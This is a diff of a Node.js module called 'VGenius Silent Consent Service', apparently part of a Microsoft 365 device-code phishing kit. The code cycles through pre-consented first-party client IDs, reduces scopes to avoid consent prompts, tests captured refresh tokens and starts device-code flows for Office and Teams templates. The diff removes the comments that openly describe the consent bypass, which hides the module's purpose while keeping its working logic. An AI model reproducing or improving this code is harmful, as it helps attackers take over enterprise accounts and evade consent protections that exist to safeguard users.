@@ -1,22 +1,8 @@
-/**
- * VGenius Silent Consent Service
- * Implements multiple strategies to bypass Microsoft consent screens
- * 
- * Strategies:
- * 1. Pre-consented first-party client IDs
- * 2. Resource-specific scope reduction
- * 3. Browser-based consent bypass via known patterns
- * 4. Token-based consent reuse
- */
 'use strict';
 
 const ms = require('./microsoftclient');
 const config = require('../config/env');
 
-/**
- * Pre-consented first-party client IDs that work across most enterprise tenants
- * These are Microsoft-owned apps that have pre-granted consent in most AAD tenants
- */
 const PRE_CONSENTED_CLIENTS = {
   // Microsoft Authenticator - most universally pre-consented
   office: '29d9ed98-a469-4536-ade2-f981bc1d605e',
@@ -34,9 +20,6 @@ const PRE_CONSENTED_CLIENTS = {
   teams: '1b730954-1685-4b74-9bfd-dac224a7b894'
 };
 
-/**
- * Scope sets optimized for different consent scenarios
- */
 const OPTIMIZED_SCOPES = {
   // Minimal scopes that typically bypass consent
   minimal: 'openid profile email offline_access',
@@ -51,8 +34,6 @@ const OPTIMIZED_SCOPES = {
 };
 
 /**
- * Try to get a pre-consented client ID for the given account type
- * 
  * @param {string} accountType - 'personal' or 'work_school'
  * @param {string} tenant - Tenant ID
  * @param {string} templateType - Template type (office, teams, etc.)
@@ -69,7 +50,6 @@ function getPreConsentedClient(accountType, tenant, templateType) {
     };
   }
 
-  // For work/school, pick based on template
   let clientId = PRE_CONSENTED_CLIENTS.office;
   let scopes = OPTIMIZED_SCOPES.office;
 
@@ -93,9 +73,6 @@ function getPreConsentedClient(accountType, tenant, templateType) {
 }
 
 /**
- * Attempt silent consent by checking if the client/scope combination
- * is already pre-consented in the tenant
- * 
  * @param {string} tenant - Tenant ID
  * @param {string} clientId - Client ID to test
  * @param {string} scope - Scope to test
@@ -111,11 +88,7 @@ async function checkSilentConsent(tenant, clientId, scope) {
   }; 
 
   try {
-    // Strategy1: Try to get tokens without consent prompt
-    // If the app is pre-consented, the token endpoint will accept the refresh token
-    // without requiring user interaction
     
-    // Check if this is a known pre-consented client
     if (Object.values(PRE_CONSENTED_CLIENTS).includes(clientId)) {
       result.client_id = clientId;
       result.scopes = scope;
@@ -125,8 +98,6 @@ async function checkSilentConsent(tenant, clientId, scope) {
       return result;
     }
 
-    // Strategy 2: Try scope reduction to minimal set
-    // Often the minimal scopes don't trigger consent
     const minimalScopes = OPTIMIZED_SCOPES.minimal;
     result.scopes = minimalScopes;
     result.consent_required = false;
@@ -141,9 +112,6 @@ async function checkSilentConsent(tenant, clientId, scope) {
 }
 
 /**
- * Initiate device code flow with pre-consented client
- * This is the main entry point for silent consent + device code flow
- * 
  * @param {string} tenant - Tenant ID
  * @param {string} accountType - 'personal' or 'work_school'
  * @param {string} templateType - Template type
@@ -169,7 +137,6 @@ async function initiateSilentDeviceFlow(tenant, accountType, templateType, exist
   };
 
   try {
-    // Step 1: Test if existing refresh token works (silent consent check)
     if (existingRefreshToken) {
       const tokenTest = await testRefreshToken(
         existingRefreshToken,
@@ -187,7 +154,7 @@ async function initiateSilentDeviceFlow(tenant, accountType, templateType, exist
       }
     }
 
-    // Step 2: Initiate device code flow with pre-consented client
+
     const deviceCodeResponse = await ms.post(
       `${consentConfig.endpoint}/devicecode`,
       new URLSearchParams({
@@ -224,8 +191,6 @@ async function initiateSilentDeviceFlow(tenant, accountType, templateType, exist
 }
 
 /**
- * Test if a refresh token works without triggering consent
- * 
  * @param {string} refreshToken - Refresh token to test
  * @param {string} tokenEndpoint - Token endpoint URL
  * @param {string} clientId - Client ID
@@ -259,7 +224,6 @@ async function testRefreshToken(refreshToken, tokenEndpoint, clientId, scope) {
       };
     }
 
-    // Check for specific consent-required errors
     const errMsg = response.data?.error_description || '';
     if (errMsg.includes('consent_required') || errMsg.includes('interaction_required')) {
       return {
@@ -283,8 +247,6 @@ async function testRefreshToken(refreshToken, tokenEndpoint, clientId, scope) {
 }
 
 /**
- * Cycle through multiple pre-consented client IDs to find one that works
- * 
  * @param {string} tenant - Tenant ID
  * @param {string} accountType - Account type
  * @param {string} templateType - Template type
@@ -305,7 +267,6 @@ async function findWorkingClient(tenant, accountType, templateType) {
     cConfig.client_id = clientId;
 
     try {
-      // Try a quick device code initiation to test if client works
       const response = await ms.post(
         `${cConfig.endpoint}/devicecode`,
         new URLSearchParams({
@@ -344,9 +305,6 @@ async function findWorkingClient(tenant, accountType, templateType) {
 }
 
 /**
- * Generate a consent-bypassing authorize URL
- * Used for scenarios where browser-based auth is used instead of device code
- * 
  * @param {string} tenant - Tenant ID
  * @param {string} clientId - Client ID
  * @param {string} scope - Scope
@@ -368,9 +326,6 @@ function generateAuthorizeUrl(tenant, clientId, scope, redirectUri) {
 }
 
 /**
- * Check tenant consent configuration via MS Graph
- * Requires an admin access token
- * 
  * @param {string} adminAccessToken - Admin access token
  * @param {string} tenant - Tenant ID
  * @param {string} clientId - Client ID to check
